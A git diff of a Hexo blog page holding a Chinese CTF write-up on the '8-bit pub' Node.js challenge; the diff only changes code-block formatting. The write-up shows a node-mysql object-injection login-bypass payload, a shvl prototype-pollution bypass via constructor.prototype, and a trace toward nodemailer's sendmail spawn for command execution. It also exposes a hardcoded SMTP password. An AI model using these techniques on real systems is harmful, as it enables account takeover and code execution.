@@ -11,6 +11,9 @@
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="s4mmy's blog" type="application/atom+xml">
 </head>
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+ <!-- 添加这行：Highlight.js JavaScript库 -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+</head>
     
     <body>
         <header class="header">
@@ -60,27 +63,7 @@
 <p>首先尝试注册登录，然而并没有什么卵用，题目需要你拿到admin的账号</p>
 <p>在<code>route/index.js</code>处可以看到各个功能的路由，查看注册和登录的源码文件。</p>
 <p>可以看到如下代码</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"> sql.query(
-      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,
-      [username, password],
-      function (err, res) &#123;
-        if (err) &#123;
-          console.log(&quot;error: &quot;, err);
-          return done(err, null);
-        &#125; else &#123;
-          return done(null, res);
-        &#125;
-      &#125;
-    );
-  &#125;,
-&#125;;
-
- signup: function (username, password, done) &#123;
-    sql.query(
-      &quot;SELECT * FROM users WHERE username &#x3D; ?&quot;,
-      [username],
-      function (err, res) &#123;
-.......</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,</span><br><span class="line">      [username, password],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span>, err);</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(err, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(<span class="literal">null</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="attr">signup</span>: <span class="keyword">function</span> (<span class="params">username, password, done</span>) &#123;</span><br><span class="line">    sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,</span><br><span class="line">      [username],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
 
 <p>这里的sql语句使用了占位符，会对传进来的参数进行转义，所以没办法进行sql注入。</p>
 <p>但是在node-mysql文档的末尾有这么一段话</p>
@@ -104,109 +87,44 @@
 <p>这里是利用了传入对象会被转换为`key`&#x3D;val的键值对的这个特性</p>
 <p>所以这里的操作是要传入一个对象，使用的是json格式的数据</p>
 <p>在后面嵌套两个password的原因是就是传入一个对象。</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这样后台的查询语句是这样的,相当于构造了一个万能密码，SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】,【and】优先于【or】</p>
 <p>sql查询语句如下</p>
-<pre class="line-numbers language-none"><code class="language-none">username &#x3D; &#39;admin&#39; AND password &#x3D; &#96;password&#96; &#x3D; true</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &#x27;admin&#x27; AND password = `password` = true</span><br></pre></td></tr></table></figure>
 
 <p>在这里我本来有个疑惑，就是在传入对象的时候为什么不能再<code>username</code>那里也传入一组对象比如</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;username&quot;:&#123;&quot;username&quot;:admin&#125;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;username&quot;:admin&#125;,&quot;password&quot;:&#123;&quot;password&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>但是经过尝试发现这样穿的话是不行的。后来问了其他师傅，在注册时传入上述的数据，然后进入数据库里面看了一下，发现如果传入的是对象的话解析之后传到数据库的内容都是NULL或者0，这样的话这句万能密码的sql语句就不能成立。</p>
 <p><img src="/../../img/8-bit%20pub-images/2.png"></p>
 <p>成功登陆之后我们可以直接跳转到admin页面</p>
 <p><img src="/../../img/8-bit%20pub-images/3.png"></p>
 <p>最早看到sql注入占位符的时候我以为是预编译，没办法注入（当然占位符也不能注入:（  ），所以我放弃了sql注入的想法，所以在这一步我原先的想法是去伪造session绕过身份验证去，因为我在通往admin的路由上看到还调用了auth.js</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">let auth &#x3D; function (req, res, next) &#123;
-  if (!req.session.username) &#123;
-    return res.redirect(302, &quot;&#x2F;&quot;);
-  &#125;
-  if (req.session.username !&#x3D;&#x3D; &quot;admin&quot;) &#123;
-    if (req.method &#x3D;&#x3D;&#x3D; &quot;GET&quot;) &#123;
-      return res.sendView(&quot;forbidden.html&quot;);
-    &#125; else &#123;
-      return res.json(&#123; message: &quot;Forbidden.&quot; &#125;);
-    &#125;
-  &#125;
-  next();
-&#125;;
-
-module.exports &#x3D; auth;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> auth = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">sendView</span>(<span class="string">&quot;forbidden.html&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Forbidden.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = auth;</span><br></pre></td></tr></table></figure>
 
 <p>这边验证的是<code>session.username</code>而<code>session.username</code>是从这里获得的</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (req, res) &#123;
-  user.signin(req.body.username, req.body.password, function (err, result) &#123;
-    if (err) &#123;
-      return res.status(500).json(&#123; message: err.message &#125;);
-    &#125;
-    if (result.length) &#123;
-      console.log(req.session)
-      req.session.username &#x3D; result[0].username;
-      return res.json(&#123; message: &quot;Signin success.&quot; &#125;);
-    &#125; else &#123;
-      return res.status(401).json(&#123; message: &quot;Username or password wrong.&quot; &#125;);
-    &#125;
-  &#125;);
-&#125;,</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">signin</span>: <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  user.<span class="title function_">signin</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>, <span class="keyword">function</span> (<span class="params">err, result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>)</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">username</span> = result[<span class="number">0</span>].<span class="property">username</span>;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Signin success.&quot;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Username or password wrong.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
 
 <p>这里调用的user.signig()函数如下</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">signin: function (username, password, done) &#123;
-    sql.query(
-      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,
-      [username, password],
-      function (err, res) &#123;
-        if (err) &#123;
-          console.log(&quot;error: &quot;, err);
-          return done(err, null);
-        &#125; else &#123;
-          return done(null, res);
-        &#125;
-      &#125;
-    );
-  &#125;,
-&#125;;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">signin</span>: <span class="keyword">function</span> (<span class="params">username, password, done</span>) &#123;</span><br><span class="line">    sql.<span class="title function_">query</span>(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,</span><br><span class="line">      [username, password],</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">err, res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span>, err);</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(err, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">done</span>(<span class="literal">null</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>所以可以得到<code>result[0].username</code>的值即为<code>session.username</code></p>
 <p>因为这题的环境是用docker搭的，没办法直接用vscode调试，所以这里的<code>result</code>的值没办法知道是什么，但猜测是数据库查询返回的结果，其中username是列名，所以我们应该是没办法伪造session的。。:(</p>
 <h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>登陆成功后跳转到admin页面，看样子像一个发送邮件的页面。开始代码审计！</p>
 <p>首先根据路由来到<code>adminController.js</code>的<code>email</code>方法，乍一看好像没有什么利用点。。</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">  email: async function (req, res) &#123;
-    let contents &#x3D; &#123;&#125;;
-
-    Object.keys(req.body).forEach((key) &#x3D;&gt; &#123;
-      shvl.set(contents, key, req.body[key]);
-    &#125;);
-
-    contents.from &#x3D; &#39;&quot;admin&quot; 2449970596@qq.com&#39;;
-
-    try &#123;
-      await send(contents);
-      return res.json(&#123;message: &quot;Success.&quot;&#125;);
-    &#125; catch (err) &#123;
-      return res.status(500).json(&#123; message: err.message &#125;);
-    &#125;
-  &#125;,
-&#125;;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">email</span>: <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">body</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">      shvl.<span class="title function_">set</span>(contents, key, req.<span class="property">body</span>[key]);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    contents.<span class="property">from</span> = <span class="string">&#x27;&quot;admin&quot; 2449970596@qq.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">send</span>(contents);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">message</span>: <span class="string">&quot;Success.&quot;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>这里有一个细节就是引入了shvl库（当时第一次审代码的时候完全没有放在心上，只是觉得有点奇怪而已，以后要多留意这些被引入的库）。</p>
 <p>其中在发信前调用了<code>shvl.set</code>方法，我们根据路径查找到<code>/node_modules/shvl/index&quot;</code>发现如下代码</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;
-  return !&#x2F;^(__proto__|constructor|prototype)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;
-    return obj[p] &#x3D; obj[p] || &#123;&#125;;
-  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;
-&#125;;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">set</span>  (object, path, val, obj) &#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/^(__proto__|constructor|prototype)$/</span>.<span class="title function_">test</span>(path) &amp;&amp; ((path = path.<span class="property">split</span> ? path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>) : path.<span class="title function_">slice</span>(<span class="number">0</span>)).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">obj, p</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.<span class="title function_">pop</span>()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>看样子有点像合并函数，但是ban了可以用来原型链污染的所有关键字，所以无法利用。</p>
 <p>其实这里出了点问题，我看网上师傅们的wp上的源码都是只有过滤<code>__proto__</code>而我手上的源码全过滤了，但是在实际测试中发现使用<code>constructor.prototype</code>又能绕过，orz.</p>
 <p>检查package.json里的shvl版本也是2.02，在github上也能看到到了2.03版本的修复中才加上了<code>constructor</code>和<code>prototype</code>。</p>
 <p><img src="/../../img/8-bit%20pub-images/4.png"></p>
 <p>这里就当做只过滤<code>__proto__</code>来进行审计吧</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">export function set  (object, path, val, obj) &#123;
-  return !&#x2F;^(__proto__)$&#x2F;.test(path) &amp;&amp; ((path &#x3D; path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123;
-    return obj[p] &#x3D; obj[p] || &#123;&#125;;
-  &#125;, obj &#x3D; object)[path.pop()] &#x3D; val), object;
-&#125;;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">set</span>  (object, path, val, obj) &#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="regexp">/^(__proto__)$/</span>.<span class="title function_">test</span>(path) &amp;&amp; ((path = path.<span class="property">split</span> ? path.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>) : path.<span class="title function_">slice</span>(<span class="number">0</span>)).<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>).<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">obj, p</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">  &#125;, obj = object)[path.<span class="title function_">pop</span>()] = val), object;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p><strong>这里又get了一个审计小技巧，对于这种在github上开源且有release更新的话可以直接去查看修改了哪些代码，直接定位历史漏洞。</strong></p>
 <p>首先实现使用test进行正则判断，path的参数内是否含有<code>__proto__</code>，所以可以判断这里存在原型链污染漏洞且使用<code>constructor.prototype</code>绕过。（虽然不是很懂后半部分代码的具体含义。。。）</p>
@@ -214,93 +132,26 @@ module.exports &#x3D; auth;</code></pre>
 <p>这里有两种寻找利用点的方法</p>
 <p>第一种</p>
 <p>在vscode全局搜索RCE利用点，例如<code>child_process</code>，可以在<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>里找到如下代码</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const spawn &#x3D; require(&#39;child_process&#39;).spawn;
-const packageData &#x3D; require(&#39;..&#x2F;..&#x2F;package.json&#39;);
-const shared &#x3D; require(&#39;..&#x2F;shared&#39;);
-.....
-class SendmailTransport &#123;
-    constructor(options) &#123;
-        options &#x3D; options || &#123;&#125;;
-
-        &#x2F;&#x2F; use a reference to spawn for mocking purposes
-        this._spawn &#x3D; spawn;
-
-        this.options &#x3D; options || &#123;&#125;;
-......</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">spawn</span>;</span><br><span class="line"><span class="keyword">const</span> packageData = <span class="built_in">require</span>(<span class="string">&#x27;../../package.json&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> shared = <span class="built_in">require</span>(<span class="string">&#x27;../shared&#x27;</span>);</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SendmailTransport</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">options</span>) &#123;</span><br><span class="line">        options = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use a reference to spawn for mocking purposes</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_spawn</span> = spawn;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">options</span> = options || &#123;&#125;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
 
 <p>继续跟进查看</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">try &#123;
-           sendmail &#x3D; this._spawn(this.path, args);
-       &#125; catch (E) &#123;
-           this.logger.error(
-               &#123;
-                   err: E,
-                   tnx: &#39;spawn&#39;,
-                   messageId
-               &#125;,
-               &#39;Error occurred while spawning sendmail. %s&#39;,
-               E.message
-           );
-           return callback(E);
-       &#125;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           sendmail = <span class="variable language_">this</span>.<span class="title function_">_spawn</span>(<span class="variable language_">this</span>.<span class="property">path</span>, args);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (E) &#123;</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">logger</span>.<span class="title function_">error</span>(</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="attr">err</span>: E,</span><br><span class="line">                   <span class="attr">tnx</span>: <span class="string">&#x27;spawn&#x27;</span>,</span><br><span class="line">                   messageId</span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="string">&#x27;Error occurred while spawning sendmail. %s&#x27;</span>,</span><br><span class="line">               E.<span class="property">message</span></span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">return</span> <span class="title function_">callback</span>(E);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
 
 <p>跟进<code>this.path</code></p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">if (options) &#123;
-            if (typeof options &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123;
-                this.path &#x3D; options;
-            &#125; else if (typeof options &#x3D;&#x3D;&#x3D; &#39;object&#39;) &#123;
-                if (options.path) &#123;
-                    this.path &#x3D; options.path;
-                &#125;
-                if (Array.isArray(options.args)) &#123;
-                    this.args &#x3D; options.args;
-                &#125;
-                this.winbreak &#x3D; [&#39;win&#39;, &#39;windows&#39;, &#39;dos&#39;, &#39;\r\n&#39;].includes((options.newline || &#39;&#39;).toString().toLowerCase());
-            &#125;
-        &#125;
-    &#125;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">path</span> = options;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (options.<span class="property">path</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">path</span> = options.<span class="property">path</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(options.<span class="property">args</span>)) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">args</span> = options.<span class="property">args</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">winbreak</span> = [<span class="string">&#x27;win&#x27;</span>, <span class="string">&#x27;windows&#x27;</span>, <span class="string">&#x27;dos&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>].<span class="title function_">includes</span>((options.<span class="property">newline</span> || <span class="string">&#x27;&#x27;</span>).<span class="title function_">toString</span>().<span class="title function_">toLowerCase</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以在这里看到要给<code>this.path</code>赋值的条件是<code>options</code>的类型要是对象和<code>option</code>的<code>args</code>属性是数组。</p>
 <p>接着要做的是检查如何触发</p>
 <p>回到<code>mail.js</code></p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">const nodemailer &#x3D; require(&quot;nodemailer&quot;);
-
-async function send(contents) &#123;
-  let transporter &#x3D; nodemailer.createTransport(&#123;
-    service: &quot;qq&quot;, &#x2F;&#x2F; Plz use your own smtp server for testing
-    port: 465,
-    secureConnection: true,
-    auth: &#123;
-      user: &quot;2449970596@qq.com&quot;,
-      pass: &quot;qlwwytxigkuzebdf&quot;,
-    &#125;,
-  &#125;);
-  return transporter.sendMail(contents);
-&#125;
-
-module.exports &#x3D; send;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nodemailer = <span class="built_in">require</span>(<span class="string">&quot;nodemailer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">contents</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> transporter = nodemailer.<span class="title function_">createTransport</span>(&#123;</span><br><span class="line">    <span class="attr">service</span>: <span class="string">&quot;qq&quot;</span>, <span class="comment">// Plz use your own smtp server for testing</span></span><br><span class="line">    <span class="attr">port</span>: <span class="number">465</span>,</span><br><span class="line">    <span class="attr">secureConnection</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">auth</span>: &#123;</span><br><span class="line">      <span class="attr">user</span>: <span class="string">&quot;2449970596@qq.com&quot;</span>,</span><br><span class="line">      <span class="attr">pass</span>: <span class="string">&quot;qlwwytxigkuzebdf&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> transporter.<span class="title function_">sendMail</span>(contents);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = send;</span><br></pre></td></tr></table></figure>
 
 <p>这边可以继续跟进的地方是<code>createTransport</code>（没办法逐行debug真麻烦。。还要自己找）</p>
 <p>在<code>node_modules\nodemailer\lib\nodemailer.js</code>中可以找到如下源码</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module.exports.createTransport &#x3D; function (transporter, defaults) &#123;
-....
-
-        if (options.pool) &#123;
-            transporter &#x3D; new SMTPPool(options);
-        &#125; else if (options.sendmail) &#123;
-            transporter &#x3D; new SendmailTransport(options);
-        &#125; else if (options.streamTransport) &#123;
-            transporter &#x3D; new StreamTransport(options);
-        &#125; else if (options.jsonTransport) &#123;
-....</code></pre>
